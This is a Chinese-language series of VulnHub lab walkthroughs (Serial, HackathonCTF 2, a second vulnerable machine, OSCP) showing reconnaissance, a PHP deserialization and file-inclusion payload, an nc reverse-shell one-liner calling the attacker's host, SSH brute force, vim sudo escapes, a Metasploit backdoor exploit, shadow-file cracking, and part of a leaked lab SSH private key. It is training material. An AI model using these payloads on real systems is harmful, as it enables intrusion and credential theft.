# vulnhub靶场serial-php渗透

## 靶场下载地址

```bash
https://www.vulnhub.com/entry/serial-1,349/
```

## 信息搜集

开启靶场并未得到任何信息

<img src="%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83.assets/image-20230527153402756.png" alt="image-20230527153402756" style="zoom: 50%;" />

对本地环境做arp扫描获取靶机IP地址 - 192.168.231.134 就是靶机的IP地址

```bash
┌──(root㉿pinginglab)-[/home/pinginglab/Cknife]
└─# arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:fb:4a:01, IPv4: 192.168.231.128
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.231.1   00:50:56:c0:00:08       VMware, Inc.
192.168.231.2   00:50:56:e1:0e:4f       VMware, Inc.
192.168.231.134 00:0c:29:67:a0:c4       VMware, Inc.
192.168.231.254 00:50:56:e6:26:4d       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9.7: 256 hosts scanned in 1.898 seconds (134.88 hosts/sec). 4 responded
```

nmap扫描获取靶机的详细信息 - 发现靶场开启了80和22端口

```bash
┌──(root㉿pinginglab)-[/home/pinginglab/Cknife]
└─# nmap 192.168.231.134
Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-27 15:35 CST
Nmap scan report for 192.168.231.134
Host is up (0.00031s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:67:A0:C4 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.26 seconds
```

进入网页查看

<img src="%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83.assets/image-20230527153921307.png" alt="image-20230527153921307" style="zoom:50%;" />

这里没有任何的头绪，现在做一个目录爆破 - 这里发现一个可下载文件 backup。下载下来得到源码

```
──(root㉿pinginglab)-[/home/pinginglab]
└─# dirsearch -u "http://192.168.231.134/"

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /root/.dirsearch/reports/192.168.231.134/-_23-05-27_14-14-19.txt

Error Log: /root/.dirsearch/logs/errors-23-05-27_14-14-19.log

Target: http://192.168.231.134/

[14:14:19] Starting: 
[14:14:20] 403 -  301B  - /.ht_wsr.txt                                     
[14:14:20] 403 -  306B  - /.htaccess.sample                                
[14:14:20] 403 -  304B  - /.htaccess.bak1
[14:14:20] 403 -  304B  - /.htaccess.orig
[14:14:20] 403 -  304B  - /.htaccess.save
[14:14:20] 403 -  302B  - /.htaccess_sc
[14:14:20] 403 -  304B  - /.htaccess_orig
[14:14:20] 403 -  305B  - /.htaccess_extra
[14:14:20] 403 -  303B  - /.htaccessOLD2
[14:14:20] 403 -  302B  - /.htaccessOLD
[14:14:20] 403 -  302B  - /.htaccessBAK
[14:14:20] 403 -  295B  - /.html                                           
[14:14:20] 403 -  294B  - /.htm
[14:14:20] 403 -  304B  - /.htpasswd_test                                  
[14:14:20] 403 -  300B  - /.htpasswds                                      
[14:14:20] 403 -  301B  - /.httr-oauth
[14:14:22] 403 -  294B  - /.php                                            
[14:14:46] 301 -  319B  - /backup  ->  http://192.168.231.134/backup/       
[14:14:46] 200 -  942B  - /backup/                                          
[14:14:51] 200 -   52B  - /index.php                                        
[14:14:51] 200 -   52B  - /index.php/login/                                 
[14:15:07] 403 -  304B  - /server-status/                                   
[14:15:07] 403 -  303B  - /server-status                                    
                                                                             
Task Completed
```

## 源码审计

==**index.php**==

```php
<?php
	include("user.class.php");

	if(!isset($_COOKIE['user'])) {
		setcookie("user", base64_encode(serialize(new User('sk4'))));
	} else {
		unserialize(base64_decode($_COOKIE['user']));
	}
	echo "This is a beta test for new cookie handler\n";
?>
```

==**log.class.php**==

```bash
<?php
  class Log {
    private $type_log;

    function __costruct($hnd) {
      $this->$type_log = $hnd;
    }

    public function handler($val) {
      include($this->type_log);
      echo "LOG: " . $val;
    }
  }
?>
```

==**user.class.php**==

```php
<?php
  include("log.class.php");

  class Welcome {
    public function handler($val) {
      echo "Hello " . $val;
    }
  }

  class User {
    private $name;
    private $wel;

    function __construct($name) {
      $this->name = $name;
      $this->wel = new Welcome();
    }

    function __destruct() {
      //echo "bye\n";
      $this->wel->handler($this->name);
    }
  }

?>
```

### 反序列化payload构造

主要思路是通过`User`类中的`wei`变量实例化`Log`类以成功利用`include`函数实现文件包含漏洞；这里要记住：反序列化输出之后，要修改`User`类中的`$wei`变量类型为“受保护的”，并对序列化字符串做修改，将`$wei`类型也改回“受保护的”类型；并且空使用`$00`代替

```php
<?php

class Log
{
    private $type_log = '/etc/passwd';

    public function handler($val)
    {
        include($this->type_log);
        echo "LOG: " . $val;
    }
}


class User
{
    private $name;
    public $wel;

    function __destruct()
    {
        //echo "bye\n";
        $this->wel->handler($this->name);
    }
}

$user = new User();
$user->wel = new Log();
echo "\n";
echo serialize($user);
```

==输出==

```php
O:4:"User":2:{s:10:"%00User%00name;s:8:"flag.php";s:9:"%00User%00wel";O:3:"Log":1:{s:13:"%00Log%00type_log";s:11:"/etc/passwd";}}
```

观察`index.php`，对于cookie的操作是需要使用`base64`解码的。所以我们需要对字符串做二次处理

```php
<?php
$str = 'O:4:"User":2:{s:10:"%00User%00name;s:8:"flag.php";s:9:"%00User%00wel";O:3:"Log":1:{s:13:"%00Log%00type_log";s:11:"/etc/passwd";}}';
$str = urldecode($str);
$str = base64_encode($str);
echo $str;
```

==输出==

```
Tzo0OiJVc2VyIjoyOntzOjEwOiIAVXNlcgBuYW1lIjtzOjM6InNrNCI7czo5OiIAVXNlcgB3ZWwiO086MzoiTG9nIjoxOntzOjEzOiIATG9nAHR5cGVfbG9nIjtzOjExOiIvZXRjL3Bhc3N3ZCI7fX0=
```

Hackbar 输出

![image-20230527155928712](%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83.assets/image-20230527155928712.png)

## 渗透测试

文件包含漏洞分为两类：

+ 远程文件包含
+ 本地文件包含

我们此时尝试远程文件包含，Kali搭建apache服务器

![image-20230527160124530](%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83.assets/image-20230527160124530.png)

修改反序列化字符串

```
O:4:"User":2:{s:10:"%00User%00name";s:3:"sk4";s:9:"%00User%00wel";O:3:"Log":1:{s:13:"%00Log%00type_log";s:33:"http://192.168.231.128/system.txt";}}
```

编码：

```
Tzo0OiJVc2VyIjoyOntzOjEwOiIAVXNlcgBuYW1lIjtzOjM6InNrNCI7czo5OiIAVXNlcgB3ZWwiO086MzoiTG9nIjoxOntzOjEzOiIATG9nAHR5cGVfbG9nIjtzOjMzOiJodHRwOi8vMTkyLjE2OC4yMzEuMTI4L3N5c3RlbS50eHQiO319
```

执行成功：

<img src="%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83.assets/image-20230527160243080.png" alt="image-20230527160243080" style="zoom:50%;" />

## shell会弹

推荐网站：

```
https://www.iculture.cc/rce/
```

回弹payload

```
rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/bash+-i+2>%261|nc+192.168.231.128+9999+>/tmp/f
```

Kali开启监听

```
nc -lvnp 9999
```

BP 发送回弹

<img src="%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83.assets/image-20230527160647471.png" alt="image-20230527160647471" style="zoom:50%;" />

nc 成功回弹

<img src="%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83.assets/image-20230527160711327.png" alt="image-20230527160711327" style="zoom:50%;" />

## 内网提权

sudo 命令尝试

<img src="%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83.assets/image-20230527160735793.png" alt="image-20230527160735793" style="zoom:50%;" />

返回根目录发现用户密码

<img src="%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83.assets/image-20230527160937947.png" alt="image-20230527160937947" style="zoom:50%;" />

ssh 登录服务器 - 登录成功！

<img src="%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83.assets/image-20230527161011529.png" alt="image-20230527161011529" style="zoom:50%;" />

此时sudo vim 不需要密码

<img src="%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83.assets/image-20230527161037878.png" alt="image-20230527161037878" style="zoom:50%;" />

vim中执行命令`!bash`提权成功

<img src="%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83.assets/image-20230527161119459.png" alt="image-20230527161119459" style="zoom:50%;" />

<img src="%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83.assets/image-20230527161127842.png" alt="image-20230527161127842" style="zoom:50%;" />

```
在vim中，你可以使用 :! 命令来运行一个外部系统命令。例如，你可以使用 :!bash 来启动一个bash shell并执行命令，而不需要退出vim1。如果你在vim中以sudo用户身份打开文件，那么你在vim中执行的命令也将以sudo用户身份执行。
```

# [vulnhub靶场之HACKATHONCTF: 2]

### 信息搜集

#### 1. nmap扫描

发现FTP、HTTP、SSH服务

```bash
# -A 使用所有高级扫描
# -sV 扫描服务版本信息
# -p- 扫描所有端口
──(root㉿pinginglab)-[/home/pinginglab]
└─# nmap -A -sV -p- 192.168.231.135
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-30 20:44 CST
Nmap scan report for 192.168.231.135
Host is up (0.0015s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 1000     1000           47 Jun 18  2021 flag1.txt
|_-rw-r--r--    1 1000     1000          849 Jun 19  2021 word.dir
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.231.129
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: hackathon2
| http-robots.txt: 1 disallowed entry 
|_*/
|_http-server-header: Apache/2.4.41 (Ubuntu)
7223/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 70:4a:a9:69:c2:d1:68:23:86:bd:85:83:31:ca:80:0c (RSA)
|   256 a6:9e:a4:18:ad:a4:2b:7e:ea:f8:5e:63:29:6e:4f:24 (ECDSA)
|_  256 4e:db:a6:d2:eb:b9:53:a5:d7:21:0b:4e:57:a5:f5:c1 (ED25519)
MAC Address: 00:0C:29:0B:26:F4 (VMware)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   1.46 ms 192.168.231.135

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.15 seconds

```

### 2. 登录ftp服务

使用匿名登录，用户名：ftp；密码：无

使用 get 下载文件

`word.dir`则是提供的字典

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# ftp 192.168.231.135
Connected to 192.168.231.135.
220 (vsFTPd 3.0.3)
Name (192.168.231.135:pinginglab): ftp
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||47836|)
150 Here comes the directory listing.
-rw-r--r--    1 1000     1000           47 Jun 18  2021 flag1.txt
-rw-r--r--    1 1000     1000          849 Jun 19  2021 word.dir
226 Directory send OK.
ftp> 

```

### 3. 目录扫描

发现隐藏目录`/happy`

里面有提示，证明SSH用户名是：hackathonll

```bash
D:\PentestTools\Gobuster>gobuster dir -u "http://192.168.231.135/" -w C:\Users\Administrator\Desktop\word.dir
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.231.135/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                C:\Users\Administrator\Desktop\word.dir
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/08/30 20:56:41 Starting gobuster in directory enumeration mode
===============================================================
/happy                (Status: 200) [Size: 110]

===============================================================
2023/08/30 20:56:41 Finished
===============================================================
```

![image-20230830210449475](%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83.assets/image-20230830210449475.png)

## 提权

### 1. 爆破SSH服务

成功得到密码：`Ti@gO`

```bash
D:\PentestTools\Hydra>hydra  -l hackathonll -P C:\Users\Administrator\Desktop\word.dir -s 7223 ssh://192.168.231.135
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-08-30 20:59:06
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 110 login tries (l:1/p:110), ~7 tries per task
[DATA] attacking ssh://192.168.231.135:7223/
[7223][ssh] host: 192.168.231.135   login: hackathonll   password: Ti@gO
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 7 final worker threads did not complete until end.
[ERROR] 7 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-08-30 20:59:17
```

### 2. vim 提权

**vim提权方式**

```
sudo vim -c ':!/bin/sh'	| vim -c ':!/bin/sh'

sudo: 是一个用于以超级用户（root）身份运行命令的工具。它需要用户输入密码来验证身份。
vim: 是一个文本编辑器，在这个命令中被调用。
-c ':!/bin/sh': 这是在 vim 命令行模式下的参数。它执行一个称为 "ex 命令" 的 vim 命令，后面紧跟着一个 shell 命令。在这里的情况下，使用 :! 表示执行外部命令，而 /bin/sh 是 Bourne shell 的路径。整个命令的目的是在 vim 中执行一个 shell。

如果用户在一个具有 sudo 权限的环境中运行这个命令，并且没有适当的安全控制，那么这个命令将允许用户以超级用户权限运行一个 shell。
```

```
sudo vim --cmd ':set shell=/bin/sh|:shell'	|	vim --cmd ':set shell=/bin/sh|:shell'
vim: 是一个文本编辑器，在这个命令中被调用。
--cmd: 是一个选项，用于在启动 vim 时执行指定的命令。这个选项可以用来执行 ex 命令，它们会在 vim 启动后立即执行。
':set shell=/bin/sh|:shell': 这是一个使用 ex 命令的序列，它们被 vim 启动后的 --cmd 选项执行。具体来说：

:set shell=/bin/sh：这个命令设置 vim 的 shell 选项为 /bin/sh，意味着后续的 shell 命令将会在这个 shell 下执行。
|：这是一个分隔符，用于分隔多个 ex 命令。
:shell：这个命令会调用系统的 shell（在这里是 /bin/sh），将用户切换到交互式 shell 环境。
```

前提：需要机器安装了python3

```
sudo vim -c ':py import os;os.execl("/bin/sh", "-c", "reset; exec sh")'	| vim -c ':py import os;os.execl("/bin/sh", "-c", "reset; exec sh")'

vim -c：在vim启动之后，执行指定操作
import os;os.execl("/bin/sh", "-c", "reset; exec sh")：这是实际的 Python 代码。它导入了 Python 的 os 模块，并调用了 os.execl() 函数，传递了两个参数：

"/bin/sh"：这是要执行的程序的路径，即 Unix/Linux 系统上的 shell 解释器路径。
"-c"：这是传递给 shell 的参数，表示在执行命令前，要执行的是一个字符串命令。
"reset; exec sh"：这是要在 shell 中执行的字符串命令。这个命令首先尝试执行 reset 命令，然后通过 exec sh 在同一个 shell 中启动一个新的 shell 进程。
总之，这个命令的目的是在 Vim 启动后，通过 Python 代码调用系统的 shell 并尝试执行一些命令，包括清屏和启动一个新的 shell 进程。
```

前提：需要机器安装了Lua

```
vim -c ':lua os.execute("reset; exec sh")'
```

# Vulnerable Machine 2

## 信息搜集

### 1. 局域网扫描

`192.168.231.136`为目标靶机

```
┌──(root㉿pinginglab)-[/home/pinginglab/2023]
└─# arp-scan -l                       
Interface: eth0, type: EN10MB, MAC: 00:0c:29:fb:4a:01, IPv4: 192.168.231.129
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.231.1   00:50:56:c0:00:08       VMware, Inc.
192.168.231.2   00:50:56:e1:0e:4f       VMware, Inc.
192.168.231.131 00:0c:29:ad:0e:a5       VMware, Inc.
192.168.231.136 00:0c:29:b5:78:a0       VMware, Inc.
192.168.231.254 00:50:56:e0:a6:25       VMware, Inc.

5 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9.7: 256 hosts scanned in 1.927 seconds (132.85 hosts/sec). 5 responded

```

### 2. 主机探测

```
┌──(root㉿pinginglab)-[/home/pinginglab/2023]
└─# nmap -T4 -p- -A -sV 192.168.231.136
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-30 23:30 CST
Nmap scan report for 192.168.231.136
Host is up (0.00085s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.3c
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d6:01:90:39:2d:8f:46:fb:03:86:73:b3:3c:54:7e:54 (RSA)
|   256 f1:f3:c0:dd:ba:a4:85:f7:13:9a:da:3a:bb:4d:93:04 (ECDSA)
|_  256 12:e2:98:d2:a3:e7:36:4f:be:6b:ce:36:6b:7e:0d:9e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
MAC Address: 00:0C:29:B5:78:A0 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### 3. 站点目录扫描

发现一个wordpress站点

```
┌──(root㉿pinginglab)-[/home/pinginglab/2023]
└─# gobuster dir -u "http://192.168.231.136/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.231.136/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/secret               (Status: 301) [Size: 319] [--> http://192.168.231.136/secret/]

```

点击login登录，并且发现可以直接使用弱口令登录：`admin，admin`

![image-20230830233213790](%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83.assets/image-20230830233213790.png)

## 渗透提权

结合题目内容，需要使用`Metasploit`模块进行渗透测试

这里直接使用最简单的方法来搜索可利用模块

```bash
----------------------------------------方法一-----------------------------------------
# nmap 探测发服务版本
21/tcp open  ftp     ProFTPD 1.3.3c
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))

# 直接在 msfconsole 中搜索版本查找可利用模块
msf6 > search ProFTPD 1.3.3c

Matching Modules
================

   #  Name                                    Disclosure Date  Rank       Check  Description
   -  ----                                    ---------------  ----       -----  -----------
   0  exploit/unix/ftp/proftpd_133c_backdoor  2010-12-02       excellent  No     ProFTPD-1.3.3c Backdoor Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/proftpd_133c_backdoor

msf6 > search OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
[-] No results from search
msf6 > search Apache httpd 2.4.18 ((Ubuntu))
[-] No results from search

# 发现一个可利用模块：exploit/unix/ftp/proftpd_133c_backdoor

-----------------------------------方法二----------------------------------
# 结合上面的信息搜集，发现一个wordpress站点，并成功进入其后台网站，尝试搜索是否有可用模块
msf6 > search type:exploit name:wordpress

Matching Modules
================

   #   Name                                                           Disclosure Date  Rank       Check  Description
   -   ----                                                           ---------------  ----       -----  -----------
   0   exploit/multi/php/wp_duplicator_code_inject                    2018-08-29       manual     Yes    Snap Creek Duplicator WordPress plugin code injection
   1   exploit/multi/http/wp_ait_csv_rce                              2020-11-14       excellent  Yes    WordPress AIT CSV Import Export Unauthenticated Remote Code Execution
   2   exploit/unix/webapp/wp_admin_shell_upload                      2015-02-21       excellent  Yes    WordPress Admin Shell Upload
   3   exploit/unix/webapp/wp_asset_manager_upload_exec               2012-05-26       excellent  Yes    WordPress Asset-Manager PHP File Upload Vulnerability
   4   exploit/multi/http/wp_crop_rce                                 2019-02-19       excellent  Yes    WordPress Crop-image Shell Upload
   5   exploit/multi/http/wp_file_manager_rce                         2020-09-09       normal     Yes    WordPress File Manager Unauthenticated Remote Code Execution

# 这里只能参考翻译和经验来找可用的模块了
# 模块 exploit/unix/webapp/wp_admin_shell_upload 也是可用的
```

模块利用

```
sf6 > use exploit/unix/ftp/proftpd_133c_backdoor
[*] Using configured payload cmd/unix/reverse
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > show options 

Module options (exploit/unix/ftp/proftpd_133c_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  192.168.231.136  yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT   21               yes       The target port (TCP)


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.231.129  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
           
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set payload cmd/unix/reverse
payload => cmd/unix/reverse
6 exploit(unix/ftp/proftpd_133c_backdoor) > exploit 

[*] Started reverse TCP double handler on 192.168.231.129:4444 
[*] 192.168.231.136:21 - Sending Backdoor Command

```

由于题目问的还有用户：`marlinspike`的密码，所以还需要对其密码进行破解

```
1. How many ports are open on the vulnerable virtual machine?
2. Which service is exploitable (include version number)?
3. What Metasploit module can be used for the exploit?
4. What is the hash algorithm for user marlinspike?
5. What is the password of user marlinspike?
```

**/etc/shadow**文件介绍

```
test2:$6$C/vGzhVe$aKK6QGdhzTmYyxp8.E68gCBkPhlWQ4W7/OpCFQYV.qsCtKaV00bToWh286yy73jedg6i0qSlZkZqQy.wmiUdj0:17470:0:99999:7:::

用户名：test2
加密后的密码：$6$C/vGzhVe$aKK6QGdhzTmYyxp8.E68gCBkPhlWQ4W7/OpCFQYV.qsCtKaV00bToWh286yy73jedg6i0qSlZkZqQy.wmiUdj0
上次修改密码的时间(从1970.1.1开始的总天数为17470)
两次修改密码间隔：没有限制
两次修改密码间隔最多的天数：没有限制
提前7天警告用户密码将过期
该用户永久可用

$id$salt$encrypted
id表示加密算法，1代表MD5，5代表SHA-256，6代表SHA-512 salt表示密码学中的Salt,系统随机生成 encrypted表示密码的hash
```

## 密码破解

将靶机上的`/etc/shadow`文件拷贝到kali，使用自带的：`john`工具

```
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# john --show /home/pinginglab/2023/shadow 
marlinspike:marlinspike:17484:0:99999:7:::

1 password hash cracked, 0 left
```

# Vulnhub 靶场 OSCP

## 1. 信息搜集

**1.1 局域网扫描**

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:fb:4a:01, IPv4: 192.168.231.129
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.231.1   00:50:56:c0:00:08       VMware, Inc.
192.168.231.2   00:50:56:e1:0e:4f       VMware, Inc.
192.168.231.139 00:0c:29:36:a6:01       VMware, Inc.
192.168.231.254 00:50:56:f4:af:6c       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9.7: 256 hosts scanned in 1.956 seconds (130.88 hosts/sec). 4 responded

```

**1.2 nmap信息搜集**

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# nmap -T4 -sV -A -Pn -p- 192.168.231.139 
Starting Nmap 7.92 ( https://nmap.org ) at 2023-09-03 21:05 CST
Nmap scan report for 192.168.231.139
Host is up (0.0015s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 91:ba:0d:d4:39:05:e3:13:55:57:8f:1b:46:90:db:e4 (RSA)
|   256 0f:35:d1:a1:31:f2:f6:aa:75:e8:17:01:e7:1e:d1:d5 (ECDSA)
|_  256 af:f1:53:ea:7b:4d:d7:fa:d8:de:0d:f2:28:fc:86:d7 (ED25519)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-generator: WordPress 5.4.2
| http-robots.txt: 1 disallowed entry 
|_/secret.txt
|_http-title: OSCP Voucher &#8211; Just another WordPress site
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|_    HY000
```

**1.3 目录扫描**

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# gobuster dir -u "http://192.168.231.139" -w /usr/share/dirbuster/wordlists/directory-list-2.3-mediu
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.231.139
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/robots.txt           (Status: 200) [Size: 36]
/wp-content           (Status: 301) [Size: 323] [--> http://192.168.231.139/wp-content/]
/wp-includes          (Status: 301) [Size: 324] [--> http://192.168.231.139/wp-includes/]
/javascript           (Status: 301) [Size: 323] [--> http://192.168.231.139/javascript/]
/wp-admin             (Status: 301) [Size: 321] [--> http://192.168.231.139/wp-admin/]
/server-status        (Status: 403) [Size: 280]
Progress: 220561 / 220562 (100.00%)
===============================================================
Finished
===============================================================
```

## 2. 外围打点

将上面找到的链接逐一打开查看，发现`/robots.txt`存在线索

![image-20230903224640105](%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83.assets/image-20230903224640105.png)

继续访问

<img src="%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83.assets/image-20230903224702472.png" alt="image-20230903224702472" style="zoom:67%;" />

看到一串编码字符串，使用`base64`解码查看，看头和尾可以看到这是一个SSH的密钥，将其复制并使用`ssh -i`连接

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAtHCsSzHtUF8K8tiOqECQYLrKKrCRsbvq6iIG7R9g0WPv9w+gkUWe
IzBScvglLE9flolsKdxfMQQbMVGqSADnYBTavaigQekue0bLsYk/rZ5FhOURZLTvdlJWxz
bIeyC5a5F0Dl9UYmzChe43z0Do0iQw178GJUQaqscLmEatqIiT/2FkF+AveW3hqPfbrw9v
A9QAIUA3ledqr8XEzY//Lq0+sQg/pUu0KPkY18i6vnfiYHGkyW1SgryPh5x9BGTk3eRYcN
w6mDbAjXKKCHGM+dnnGNgvAkqT+gZWz/Mpy0ekauk6NP7NCzORNrIXAYFa1rWzaEtypHwY
kCEcfWJJlZ7+fcEFa5B7gEwt/aKdFRXPQwinFliQMYMmau8PZbPiBIrxtIYXy3MHcKBIsJ
0HSKv+HbKW9kpTL5OoAkB8fHF30ujVOb6YTuc1sJKWRHIZY3qe08I2RXeExFFYu9oLug0d
tHYdJHFL7cWiNv4mRyJ9RcrhVL1V3CazNZKKwraRAAAFgH9JQL1/SUC9AAAAB3NzaC1yc2
EAAAGBALRwrEsx7VBfCvLYjqhAkGC6yiqwkbG76uoiBu0fYNFj7/cPoJFFniMwUnL4JSxP
X5aJbCncXzEEGzFRqkgA52AU2r2ooEHpLntGy7GJP62eRYTlEWS073ZSVsc2yHsguWuRdA
5fVGJswoXuN89A6NIkMNe/BiVEGqrHC5hGraiIk/9hZBfgL3lt4aj3268PbwPUACFAN5Xn
aq/FxM2P/y6tPrEIP6VLtCj5GNfIur534mBxpMltUoK8j4ecfQRk5N3kWHDcOpg2wI1yig
hxjPnZ5xjYLwJKk/oGVs/zKctHpGrpOjT+zQszkTayFwGBWta1s2hLcqR8GJAhHH1iSZWe
/n3BBWuQe4BMLf2inRUVz0MIpxZYkDGDJmrvD2Wz4gSK8bSGF8tzB3CgSLCdB0ir/h2ylv
ZKUy+TqAJAfHxxd9Lo1Tm+mE7nNbCSlkRyGWN6ntPCNkV3hMRRWLvaC7oNHbR2HSRxS+3F
ojb+JkcifUXK4VS9VdwmszWSisK2kQAAAAMBAAEAAAGBALCyzeZtJApaqGwb6ceWQkyXXr
